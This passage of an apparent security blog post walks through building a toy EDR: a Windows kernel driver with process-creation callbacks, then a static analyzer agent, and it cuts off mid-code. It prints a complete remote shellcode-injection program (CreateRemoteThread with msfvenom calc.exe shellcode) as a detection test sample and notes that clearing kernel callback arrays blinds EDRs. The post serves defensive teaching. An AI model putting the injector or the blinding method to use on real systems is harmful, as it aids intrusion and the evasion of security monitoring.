loading=\"lazy\" decoding=\"async\" width=\"790\" height=\"529\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kernelcallback.png\" alt=\"\" class=\"wp-image-67725\"></a></figure></div>\n\n\n<p>As you can see, being aware of a process being created is very interesting and important information for an EDR. For that reason, each and every EDR&#x2019;s driver registers kernel callbacks in order to monitor process creation via the PsSetCreateProcessNotifyRoutine function. It&#x2019;s prototype is the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>NTSTATUS PsSetCreateProcessNotifyRoutine(\n    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, // Pointer to the function to execute when a process is created\n    BOOLEAN                        Remove         // Whether the routine specified by NotifyRoutine should be added to or removed from the system&apos;s list of notification routines\n);</code></pre>\n\n\n\n<p>Pretty simple right? The first argument is a pointer to a routine that is going to be executed each time the driver receives a notification from the kernel while the second one specifies whether the callback should be registered or unregistered. In the following code, this routine is the CreateProcessNotifyRoutine function:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>#include &lt;Ntifs.h&gt;\n#include &lt;ntddk.h&gt;\n#include &lt;wdf.h&gt;\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\\\Device\\\\MyDumbEDR&quot;); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\\\??\\\\MyDumbEDR&quot;);        // Symlink\n\n// handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(HANDLE ppid, HANDLE pid, BOOLEAN create){\n    if (create){\n        PEPROCESS process = NULL;\n        PUNICODE_STRING processName = NULL;\n\n        // Retrieve process ID\n        PsLookupProcessByProcessId(pid, &amp;process);\n\n        // Retrieve the process name from the EPROCESS structure\n        SeLocateProcessImageName(process, &amp;processName);\n\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: %d (%wZ) launched.\\n&quot;, pid, processName);\n    }\n    else{\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: %d got killed.\\n&quot;, pid);\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\\n&quot;);\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject-&gt;DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&amp;SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath){\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Initializing the driver\\n&quot;);\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;\n    \n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &amp;deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &amp;DeviceObject\t\t   // the resulting pointer\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\\n&quot;);\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&amp;symlinkName, &amp;deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\\n&quot;);\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);\n    \n    return STATUS_SUCCESS;\n}</code></pre>\n\n\n\n<p>Build the driver, launch it, open DbgView and spawn whatever process you want. If everything went well you should see debug messages in DbgView printing the PID, as well as the process name of the process being launched or killed:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/dumb_edr_the_beginning.png\"><img loading=\"lazy\" decoding=\"async\" width=\"761\" height=\"38\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/dumb_edr_the_beginning.png\" alt=\"\" class=\"wp-image-67726\"></a></figure></div>\n\n\n<p>Being aware of process creation sure is interesting but we need to develop logic that is going to allow our EDR to determine whether or not the target process should be created in the first place. To do this we will have to use the extended function of PsSetCreateProcessNotifyRoutine called PsSetCreateProcessNotifyRoutineEx. The prototype for this function is the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>NTSTATUS PsSetCreateProcessNotifyRoutineEx(\n    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, // Pointer to the PCreateProcessNotifyRoutineEx structure\n    BOOLEAN                           Remove         // Whether or not we should add or remove the callback\n);</code></pre>\n\n\n\n<p>At first glance the functions PsSetCreateProcessNotifyRoutineEx and PsSetCreateProcessNotifyRoutine look identical but when we take a closer look at the first argument of the PsSetCreateProcessNotifyRoutineEx we can see that the structure is a little bit more complex:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>PCREATE_PROCESS_NOTIFY_ROUTINE PcreateProcessNotifyRoutine;\nvoid PcreateProcessNotifyRoutineEx(\n    PEPROCESS Process,                  // Pointer to the EPROCESS structure\n    HANDLE ProcessId,                   // Process PID\n    PPS_CREATE_NOTIFY_INFO CreateInfo   // Process structure containing information about the process being launched\n)</code></pre>\n\n\n\n<p>The third variable contains information about the process being launched such as its command line, its parent PID, its image filename and so on:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>typedef struct _PS_CREATE_NOTIFY_INFO {\n    SIZE_T              Size;\n    union {\n        ULONG Flags;\n        struct {\n            ULONG FileOpenNameAvailable : 1;  //\n            ULONG IsSubsystemProcess : 1;     \n            ULONG Reserved : 30;\n        };\n    };\n    HANDLE              ParentProcessId;     // Parent PID\n    CLIENT_ID           CreatingThreadId;    // Thread id \n    struct _FILE_OBJECT *FileObject; \n    PCUNICODE_STRING    ImageFileName;       // Name of the binary\n    PCUNICODE_STRING    CommandLine;         // Arguments passed to the binary\n    NTSTATUS            CreationStatus;      // This variable holds whether or not the process should be created\n} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;</code></pre>\n\n\n\n<p>What&#x2019;s interesting here is the CreationStatus variable which is where the driver will store its decision (i.e., should we allow or deny the process creation). This variable can contain two values:</p>\n\n\n\n<ul>\n<li>STATUS_SUCCESS: the driver informs the kernel that the process can be launched</li>\n\n\n\n<li>STATUS_ACCESS_DENIED: the driver informs the kernel that the process can not be launched</li>\n</ul>\n\n\n\n<p>Here is the final implementation of the kernel callback mechanism on our dumb EDR:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>#include &lt;Ntifs.h&gt;\n#include &lt;ntddk.h&gt;\n#include &lt;wdf.h&gt;\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\\\Device\\\\MyDumbEDR&quot;); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\\\??\\\\MyDumbEDR&quot;);        // Symlink\n\n// Handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo) {\n    UNREFERENCED_PARAMETER(process);\n    UNREFERENCED_PARAMETER(pid);\n    \n    // Never forget this if check because if you don&apos;t, you&apos;ll end up crashing your Windows system ;P\n    if (createInfo != NULL) {\n        // Compare the command line of the launched process to the notepad string\n        if (wcsstr(createInfo-&gt;CommandLine-&gt;Buffer, L&quot;notepad&quot;) != NULL){\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Process (%ws) allowed.\\n&quot;, createInfo-&gt;CommandLine-&gt;Buffer);\n            // Process allowed\n            createInfo-&gt;CreationStatus = STATUS_SUCCESS;\n        }\n\n        // Compare the command line of the launched process to the mimikatz string\n        if (wcsstr(createInfo-&gt;CommandLine-&gt;Buffer, L&quot;mimikatz&quot;) != NULL) {\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Process (%ws) denied.\\n&quot;, createInfo-&gt;CommandLine-&gt;Buffer);\n            // Process denied\n            createInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED;\n        }\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\\n&quot;);\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject-&gt;DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&amp;SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Initializing the driver\\n&quot;);\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &amp;deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &amp;DeviceObject\t\t   // the resulting pointer\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\\n&quot;);\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&amp;symlinkName, &amp;deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\\n&quot;);\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Registers the kernel callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Driver created\\n&quot;);\n    return STATUS_SUCCESS;\n}</code></pre>\n\n\n\n<p>The logic is pretty dumb, but for demonstration purposes if the image filename of the process being created is mimikatz, then the EDR blocks the creation of the process:</p>\n\n\n\n<iframe style=\"aspect-ratio: 16 / 9; height: auto; width: 100%;\" src=\"https://www.youtube.com/embed/q6JwH-oYmHc?si=H4fEP73AVvS-ctLl\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n\n\n<p>As you can see, notepad.exe is allowed while mimikatz.exe is denied, perfect!</p>\n\n\n\n<p>Now to go a little deeper in the kernel callback mechanism, we may ask ourself how the kernel is able to know if a driver registered a kernel callback? Well for each function callback we mentioned before, there is an array in kernel memory that stores pointers to callbacks (like those from EDR routines):</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>Function callback</td><td>Corresponding array nam</td><td>Max number of callbacks</td></tr><tr><td>PsSetCreateProcessNotifyRoutine</td><td>Ps<strong>p</strong>CreateProcessNotifyRoutine</td><td>64</td></tr><tr><td>PsSetCreateThreadNotifyRoutine</td><td>Ps<strong>p</strong>CreateThreadNotifyRoutine</td><td>64</td></tr><tr><td>PsSetLoadImageNotifyRoutine</td><td>Ps<strong>p</strong>LoadImageNotifyRoutine</td><td>8</td></tr><tr><td>CmRegisterCallback</td><td>Cm<strong>p</strong>CallBackVector</td><td>100</td></tr></tbody></table></figure>\n\n\n\n<p>Using WinDBG.exe we can check the actual content of these arrays. For example on the following screenshot we can see that the PspCreateProcessNotifyRoutine contains 9 hexadecimal addresses, hence 9 kernel callbacks:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/pspcreateprocessnotifyroutine.png\"><img loading=\"lazy\" decoding=\"async\" width=\"494\" height=\"157\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/pspcreateprocessnotifyroutine.png\" alt=\"\" class=\"wp-image-67728\"></a></figure></div>\n\n\n<p>Therefore, each time a process is launched, the kernel will read the PspCreateProcessNotifyRoutine array and for each of the 9 pointers, it will send a notification about the process being created. As an attacker these arrays are specifically interesting because if you can overwrite them or remove the pointers, you will basically be able to &#x201C;blind&#x201D; the EDR and thus prevent it from monitoring the system (and there is already a pretty cool tool that will allow you doing that, <a href=\"https://github.com/br-sn/CheekyBlinder\">CheekyBlinder</a>).</p>\n\n\n\n<p>At this point our driver is able to monitor for process creation and deny it if the image filename is mimikatz. Obviously this logic is not enough because if you rename mimikatz.exe to notmimikatz.exe, you will bypass the check. Thus we will have to develop a more complex detection routine.</p>\n\n\n\n<h2 class=\"wp-block-heading\">VII/ <strong>From theorical kernel callbacks to a fully working EDR</strong></h2>\n\n\n\n<p>Just being aware of a process being created on the system is interesting but if we don&#x2019;t act on the information, it&#x2019;s useless. As a security product developer we need to implement some sort of logic that will allow us to determine if this process is legitimate or not. For security and stability reasons (mostly because developing in kernel space is a nightmare) every EDR relies on a user space agent that orchestrates the entire EDR solution. This agent is typically doing at least two things:</p>\n\n\n\n<ul>\n<li>It analyzes binaries being launched on the system statically</li>\n\n\n\n<li>It injects a custom DLL into the process in order to monitor API calls</li>\n</ul>\n\n\n\n<p>So basically a more realistic, yet simplistic, schema of how a EDR works would be the following:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/drivertoagent.png\"><img loading=\"lazy\" decoding=\"async\" width=\"792\" height=\"625\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/drivertoagent.png\" alt=\"\" class=\"wp-image-67729\"></a></figure></div>\n\n\n<p>The kernel driver receives notifications about specific actions being executed on the system via the kernel callbacks mechanism, then it forwards this to the agent where most of the detection logic is developed.</p>\n\n\n\n<p>So we are going to have to develop a custom user space agent that is going to be the one analysing the system. But before going further let&#x2019;s settle on what are our expectations for our EDR. At this point the only thing I wanted MyDumbEDR to be able to detect is binaries that attempt to inject shellcode into remote process using the following simple CreateRemoteThread technique:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>\n#include &quot;stdio.h&quot;\n#include &lt;Windows.h&gt;\n#include &lt;TlHelp32.h&gt;\n\nint get_process_id_from_szexefile(wchar_t processName[]) {\n\tPROCESSENTRY32 entry = { 0 };\n\tentry.dwSize = sizeof(PROCESSENTRY32);\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\tif (Process32First(snapshot, &amp;entry) == TRUE) {\n\t\twhile (Process32Next(snapshot, &amp;entry) == TRUE) {\n\t\t\tif (wcscmp(entry.szExeFile, processName) == 0) {\n\t\t\t\treturn entry.th32ProcessID;\n\t\t\t}\n\t\t}\n\t}\n\telse {\n\t\tprintf(&quot;CreateToolhelper32Snapshot failed : %d\\n&quot;, GetLastError());\n\t\texit(1);\n\t}\n\tprintf(&quot;Process not found.\\n&quot;);\n\texit(1);\n}\n\nvoid check_if_se_debug_privilege_is_enabled() {\n\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());\n\tHANDLE hToken;\n\tOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);\n\tDWORD cbSize;\n\tGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &amp;cbSize);\n\tPTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);\n\tGetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &amp;cbSize);\n\tDWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL-&gt;Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));\n\n\tTOKEN_PRIVILEGES tp;\n\n\tLUID luidSeDebugPrivilege;\n\tif (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidSeDebugPrivilege) == 0) {\n\t\tprintf(&quot;SeDebugPrivilege not owned\\n&quot;);\n\t}\n\telse {\n\t\tprintf(&quot;SeDebugPrivilege owned\\n&quot;);\n\t}\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = luidSeDebugPrivilege;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {\n\t\tprintf(&quot;SeDebugPrivilege adjust token failed: %d\\n&quot;, GetLastError());\n\t}\n\telse {\n\t\tprintf(&quot;SeDebugPrivilege enabled.\\n&quot;);\n\t}\n\n\tCloseHandle(hProcess);\n\tCloseHandle(hToken);\n}\n\nint main() {\n\tprintf(&quot;Launching remote shellcode injection\\n&quot;);\n\t\n\t// DO NOT REMOVE\n\t// When loading a DLL remotely, its content won&apos;t apply until all DLL&apos;s are loaded\n\t// For some reason it leads to a race condition which is not part of the challenge\n\t// Hence do not remove the Sleep (even if it&apos;d allow you bypassing the hooks)\n\tSleep(5000);\n\t// DO NOT REMOVE\n\tcheck_if_se_debug_privilege_is_enabled();\n\twchar_t processName[] = L&quot;notepad.exe&quot;;\n\tint processId = get_process_id_from_szexefile(processName);\n\tprintf(&quot;Injecting to PID: %i\\n&quot;, processId);\n\tHANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));\n\t\n\t\n\t// msfvenom -p windows/x64/exec CMD=calc.exe -b &quot;\\x00\\x0a\\0d&quot; -f c\n\tunsigned char shellcode[] =\n\t\t&quot;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdb\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff&quot;\n\t\t&quot;\\xff\\xff\\x48\\xbb\\x33\\xef\\x18\\x46\\xf8\\x06\\x62\\xef\\x48\\x31\\x58&quot;\n\t\t&quot;\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xcf\\xa7\\x9b\\xa2\\x08\\xee&quot;\n\t\t&quot;\\xa2\\xef\\x33\\xef\\x59\\x17\\xb9\\x56\\x30\\xbe\\x65\\xa7\\x29\\x94\\x9d&quot;\n\t\t&quot;\\x4e\\xe9\\xbd\\x53\\xa7\\x93\\x14\\xe0\\x4e\\xe9\\xbd\\x13\\xa7\\x93\\x34&quot;\n\t\t&quot;\\xa8\\x4e\\x6d\\x58\\x79\\xa5\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xd3\\x79&quot;\n\t\t&quot;\\x3a\\xfa\\x2a\\x42\\xae\\xf2\\x26\\x15\\x07\\xf9\\xc7\\x80\\x02\\x61\\xae&quot;\n\t\t&quot;\\x49\\x0e\\x73\\x54\\x42\\x64\\x71\\xd3\\x50\\x47\\x28\\x8d\\xe2\\x67\\x33&quot;\n\t\t&quot;\\xef\\x18\\x0e\\x7d\\xc6\\x16\\x88\\x7b\\xee\\xc8\\x16\\x73\\x4e\\x7a\\xab&quot;\n\t\t&quot;\\xb8\\xaf\\x38\\x0f\\xf9\\xd6\\x81\\xb9\\x7b\\x10\\xd1\\x07\\x73\\x32\\xea&quot;\n\t\t&quot;\\xa7\\x32\\x39\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xae\\xd9\\x8f\\xf5\\x47&quot;\n\t\t&quot;\\x63\\x2e\\x0b\\x0f\\x6d\\xb7\\xb4\\x05\\x2e\\xcb\\x3b\\xaa\\x21\\x97\\x8d&quot;\n\t\t&quot;\\xde\\x3a\\xab\\xb8\\xaf\\x3c\\x0f\\xf9\\xd6\\x04\\xae\\xb8\\xe3\\x50\\x02&quot;\n\t\t&quot;\\x73\\x46\\x7e\\xa6\\x32\\x3f\\x59\\xcd\\xfc\\x8e\\x2a\\xee\\xe3\\xae\\x40&quot;\n\t\t&quot;\\x07\\xa0\\x58\\x3b\\xb5\\x72\\xb7\\x59\\x1f\\xb9\\x5c\\x2a\\x6c\\xdf\\xcf&quot;\n\t\t&quot;\\x59\\x14\\x07\\xe6\\x3a\\xae\\x6a\\xb5\\x50\\xcd\\xea\\xef\\x35\\x10\\xcc&quot;\n\t\t&quot;\\x10\\x45\\x0e\\x42\\x07\\x62\\xef\\x33\\xef\\x18\\x46\\xf8\\x4e\\xef\\x62&quot;\n\t\t&quot;\\x32\\xee\\x18\\x46\\xb9\\xbc\\x53\\x64\\x5c\\x68\\xe7\\x93\\x43\\xf6\\xd7&quot;\n\t\t&quot;\\x4d\\x65\\xae\\xa2\\xe0\\x6d\\xbb\\xff\\x10\\xe6\\xa7\\x9b\\x82\\xd0\\x3a&quot;\n\t\t&quot;\\x64\\x93\\x39\\x6f\\xe3\\xa6\\x8d\\x03\\xd9\\xa8\\x20\\x9d\\x77\\x2c\\xf8&quot;\n\t\t&quot;\\x5f\\x23\\x66\\xe9\\x10\\xcd\\x05\\xc2\\x5a\\x35\\x86\\x5d\\x8b\\x77\\x31&quot;\n\t\t&quot;\\x8b\\x5a\\x31\\x96\\x40\\x9b\\x7d\\x2b\\xcb\\x34\\x3e\\x8c\\x52\\x83\\x7b&quot;\n\t\t&quot;\\x68\\x9d\\x7e\\x07\\xef&quot;;\n    printf(&quot;VirtualAllocEx\\n&quot;);\n\tPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\n\tprintf(&quot;WriteProcessMemory\\n&quot;);\n\tWriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);\n\t\n\tprintf(&quot;CreateRemoteThread\\n&quot;);\n\tHANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\n\t\n\tprintf(&quot;Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\\n&quot;);\n\tprintf(&quot;Expect more checks in the upcoming weeks ;)\\n&quot;);\n\tCloseHandle(processHandle);\n\treturn 0;\n}</code></pre>\n\n\n\n<p>There are quite a few markers that can be used to flag this binary as malicious. First, it uses multiple functions in an order that is suspicious: OpenProcess &gt; VirtualAllocEx &gt; WriteProcessMemory &gt; CreateRemoteThread. Then, the binary is allocating RWX (read, write, execute) memory which is suspicious. Finally it contains suspicious strings as well as an obviously flagged msfvenom shellcode payload.</p>\n\n\n\n<p>For our EDR, I decided to create two agents instead of one. Both these agents will receive information from the driver via a named pipe which is an <a href=\"https://sensepost.com/blog/2021/building-an-offensive-rpc-interface/\"><strong>I</strong>nternal <strong>P</strong>rocess <strong>C</strong>ommunication</a> mechanism.</p>\n\n\n\n<p>Thus, the MyDumbEDR relies on 3 components:</p>\n\n\n\n<ul>\n<li>The kernel driver which will receive notifications about processes being created</li>\n\n\n\n<li>The StaticAnalyzer agent which will statically analyse the binary</li>\n\n\n\n<li>The RemoteInjector agent which will inject a custom DLL in each process being created</li>\n</ul>\n\n\n\n<p>Schematically:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/mydumbedrflow.png\"><img loading=\"lazy\" decoding=\"async\" width=\"724\" height=\"412\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/mydumbedrflow.png\" alt=\"\" class=\"wp-image-67730\"></a></figure></div>\n\n\n<p>Let&#x2019;s take a closer look at what both the agents do.</p>\n\n\n\n<h4 class=\"wp-block-heading\">1/ The static analyzer</h4>\n\n\n\n<p>The static analyser receives the path of the image filename of the processes being launched. It will then statically check for three things:</p>\n\n\n\n<ul>\n<li>If the binary is signed</li>\n\n\n\n<li>If the OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread functions are listed in the IAT (<strong>I</strong>mport <strong>A</strong>ddress <strong>T</strong>able)</li>\n\n\n\n<li>If the string SeDebugPrivilege is present in the binary</li>\n</ul>\n\n\n\n<p>Below is the code of the agent:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;dbghelp.h&gt;\n#include &lt;wintrust.h&gt;\n#include &lt;Softpub.h&gt;\n#include &lt;wincrypt.h&gt;\n\n#pragma comment (lib, &quot;wintrust.lib&quot;)\n#pragma comment(lib, &quot;dbghelp.lib&quot;)\n#pragma comment(lib, &quot;crypt32.lib&quot;)\n\n#define MESSAGE_SIZE 2048\n\nBOOL VerifyEmbeddedSignature(const wchar_t* binaryPath) {\n    LONG lStatus;\n    WINTRUST_FILE_INFO FileData;\n    memset(&amp;FileData, 0, sizeof(FileData));\n    FileData.cbStruct = sizeof(WINTRUST_FILE_INFO);\n    FileData.pcwszFilePath = binaryPath;\n    FileData.hFile = NULL;\n    FileData.pgKnownSubject = NULL;\n    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;\n    WINTRUST_DATA WinTrustData;\n\n    // Initializing necessary structures\n    memset(&amp;WinTrustData, 0, sizeof(WinTrustData));\n    WinTrustData.cbStruct = sizeof(WinTrustData);\n    WinTrustData.pPolicyCallbackData = NULL;\n    WinTrustData.pSIPClientData = NULL;\n    WinTrustData.dwUIChoice = WTD_UI_NONE;\n    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;\n    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;\n    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;\n    WinTrustData.hWVTStateData = NULL;\n    WinTrustData.pwszURLReference = NULL;\n    WinTrustData.dwUIContext = 0;\n    WinTrustData.pFile = &amp;FileData;\n\n    // WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.\n    lStatus = WinVerifyTrust(NULL, &amp;WVTPolicyGUID, &amp;WinTrustData);\n\n    BOOL isSigned;\n    switch (lStatus) {\n        // The file is signed and the signature was verified\n    case ERROR_SUCCESS:\n        isSigned = TRUE;\n        break;\n\n        // File is signed but the signature is not verified or is not trusted\n    case TRUST_E_SUBJECT_FORM_UNKNOWN || TRUST_E_PROVIDER_UNKNOWN || TRUST_E_EXPLICIT_DISTRUST || CRYPT_E_SECURITY_SETTINGS || TRUST_E_SUBJECT_NOT_TRUSTED:\n        isSigned = TRUE;\n        break;\n\n        // The file is not signed\n    case TRUST_E_NOSIGNATURE:\n        isSigned = FALSE;\n        break;\n\n        // Shouldn&apos;t happen but hey may be!\n    default:\n        isSigned = FALSE;\n        break;\n    }\n\n    // Any hWVTStateData must be released by a call with close.\n    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;\n    WinVerifyTrust(NULL, &amp;WVTPolicyGUID, &amp;WinTrustData);\n\n    return isSigned;\n}\n\nBOOL ListImportedFunctions(const wchar_t* binaryPath) {\n    BOOL isOpenProcessPresent = FALSE;\n    BOOL isVirtualAllocExPresent = FALSE;\n    BOOL isWriteProcessMemoryPresent = FALSE;\n    BOOL isCreateRemoteThreadPresent = FALSE;\n    // Load the target binary so that we can parse its content\n    HMODULE hModule = LoadLibraryEx(binaryPath, NULL, DONT_RESOLVE_DLL_REFERENCES);\n    if (hModule != NULL) {\n        // Get NT headers from the binary\n        IMAGE_NT_HEADERS* ntHeaders = ImageNtHeader(hModule);\n        if (ntHeaders != NULL) {\n            // Locate the IAT\n            IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hModule + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n            // Loop over the DLL&apos;s\n            while 